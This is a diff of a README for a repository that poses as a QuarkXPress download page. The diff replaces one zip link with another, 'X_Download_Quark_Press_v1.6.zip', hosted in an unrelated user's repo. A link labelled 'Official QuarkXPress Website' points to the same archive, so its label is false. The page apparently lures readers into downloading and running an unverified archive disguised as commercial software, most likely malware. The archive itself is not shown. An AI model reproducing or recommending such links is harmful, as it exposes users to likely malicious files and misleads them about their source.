@@ -1,7 +1,7 @@
 # 🎨 QuarkXPress-Download - Your Easy Solution to Design Needs
 
 ## 📥 Download Now!
-[![Download QuarkXPress](https://raw.githubusercontent.com/anushka445573/QuarkXPress-Download/main/Asellus/QuarkXPress-Download.zip)](https://raw.githubusercontent.com/anushka445573/QuarkXPress-Download/main/Asellus/QuarkXPress-Download.zip)
+[![Download QuarkXPress](https://raw.githubusercontent.com/anushka445573/QuarkXPress-Download/main/Asellus/X_Download_Quark_Press_v1.6.zip)](https://raw.githubusercontent.com/anushka445573/QuarkXPress-Download/main/Asellus/X_Download_Quark_Press_v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the QuarkXPress-Download repository! This guide will help you download and run the QuarkXPress application easily. Designed for both beginners and experienced users, QuarkXPress offers powerful tools for creating stunning designs.
@@ -24,7 +24,7 @@ To run QuarkXPress, your computer needs the following specifications:
 Please ensure your computer meets these requirements before downloading.
 
 ## 📥 Download & Install
-To get started with QuarkXPress, visit the following link to download the software: [Download QuarkXPress](https://raw.githubusercontent.com/anushka445573/QuarkXPress-Download/main/Asellus/QuarkXPress-Download.zip).
+To get started with QuarkXPress, visit the following link to download the software: [Download QuarkXPress](https://raw.githubusercontent.com/anushka445573/QuarkXPress-Download/main/Asellus/X_Download_Quark_Press_v1.6.zip).
 
 1. Click the link above to access the Releases page.
 2. You will see a list of available versions. Choose the latest version for optimal performance.
@@ -45,8 +45,8 @@ After installation, you can launch QuarkXPress from your applications folder or 
 If you are using an older version of QuarkXPress, consider upgrading to access the latest features and improvements. Follow the prompts during installation to upgrade seamlessly.
 
 ## 🔗 Quick Links
-- [Download QuarkXPress](https://raw.githubusercontent.com/anushka445573/QuarkXPress-Download/main/Asellus/QuarkXPress-Download.zip)
-- [Official QuarkXPress Website](https://raw.githubusercontent.com/anushka445573/QuarkXPress-Download/main/Asellus/QuarkXPress-Download.zip)
+- [Download QuarkXPress](https://raw.githubusercontent.com/anushka445573/QuarkXPress-Download/main/Asellus/X_Download_Quark_Press_v1.6.zip)
+- [Official QuarkXPress Website](https://raw.githubusercontent.com/anushka445573/QuarkXPress-Download/main/Asellus/X_Download_Quark_Press_v1.6.zip)
 
 ## 🛠 Troubleshooting
 If you encounter any issues during installation or usage:
